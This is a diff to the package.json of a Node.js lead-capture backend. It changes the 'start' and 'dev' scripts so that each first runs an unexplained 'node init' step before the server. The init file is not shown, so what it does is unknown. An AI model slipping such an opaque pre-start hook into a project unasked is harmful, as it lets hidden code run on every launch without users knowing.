@@ -4,8 +4,8 @@
   "description": "Lead capture and product/service flow backend",
   "main": "src/server.js",
   "scripts": {
-    "start": "node src/server.js",
-    "dev": "nodemon src/server.js"
+    "start": "node init && node src/server.js",
+    "dev": "node init && nodemon src/server.js"
   },
   "dependencies": {
     "express": "^4.18.2",
